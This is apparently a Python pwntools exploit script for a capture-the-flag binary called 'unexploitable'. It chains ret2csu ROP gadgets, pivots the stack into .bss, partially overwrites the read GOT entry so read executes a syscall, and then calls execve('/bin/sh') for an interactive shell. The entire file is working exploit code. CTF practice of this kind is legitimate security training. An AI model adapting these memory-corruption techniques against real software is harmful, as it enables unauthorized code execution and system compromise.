#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.log_level = 'debug'

elf  = ELF('./unexploitable')

# Mem locations
dynamic_fini = 0x600e78

# ROP Gadgets
__libc_csu_init  = elf.symbols['__libc_csu_init']
__libc_csu_init1 = __libc_csu_init + 80
__libc_csu_init2 = __libc_csu_init + 102
ret              = 0x400417  # for stack alignment
pop_rbp_ret      = 0x400512  # pop rbp ; ret
leave_ret        = 0x400576  # leave ; ret
#leave = mov rsp, rbp ; pop rbp

# Byte sequence alias
A8 = 8 * b'A'


def uROP(addr, arg1, arg2, arg3, should_align=False) -> bytes:
    """
    Returns an ROP chain to call a function
    :param addr: the address of the function
    :param arg1: edi
    :param arg2: rsi
    :param arg3: rdx
    :param should_align: align the stack before returning to `addr`?
    :return: a sequence of bytes
    """
    payload  = p64(__libc_csu_init2)    # ret2csu
    payload += A8                       # dummy (這題的 csu 比較特別)
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(dynamic_fini)        # r12
    payload += p64(arg1)                # r13 -> edi
    payload += p64(arg2)                # r14 -> rsi
    payload += p64(arg3)                # r15 -> rdx
    payload += p64(__libc_csu_init1)    # ret -> call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini
    payload += 7 * A8                   # padding
    if should_align:
        payload += p64(ret)             # ret (stack alignment)
    payload += p64(addr)                # ret
    return payload


def main():
    """
    Main idea: call sys_execve("/bin/sh", NULL, NULL).

    However, there's no syscall gadget available.
    We can modify the LSB of *elf.got['read'] to c0
    and then all subsequent calls to read() will be
    executing syscall instead.

    After the call to read(0, elf.got['read'], 1),
    rax will be 1 (i.e. sys_write)
    """
    proc = process(['./ld-2.32.so', './unexploitable'], env={'LD_PRELOAD': './libc-2.32.so'})
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    pivot_dest = elf.bss() + 0x100

    time.sleep(3)
    payload  = A8 * 3
    # stack pivot
    payload += uROP(elf.sym['read'], 0, pivot_dest, 1024, True)
    payload += p64(pop_rbp_ret)        # ret
    payload += p64(pivot_dest)         # rbp
    payload += p64(leave_ret)          # ret
    proc.send(payload)

    # after stack pivoting
    payload  = p64(0)                  # rbp (dummy)
    payload += uROP(elf.sym['read'], 0, elf.got['read'], 1, True) # modify got['read']
    payload += uROP(elf.sym['read'], 1, 0, 0)  # set rax to 0
    payload += uROP(elf.sym['read'], 0, elf.bss(), 59)  # read '/bin/sh' into elf.bss() and set rax = 59
    payload += uROP(elf.sym['read'], elf.bss(), 0, 0)  # sys_execve
    proc.send(payload)

    time.sleep(0.5)
    proc.send(b'\xc0')

    time.sleep(0.5)
    proc.send(b'/bin/sh'.ljust(59, b'\x00'))

    # Give up your control to me...
    proc.interactive()


if __name__ == '__main__':
    main()
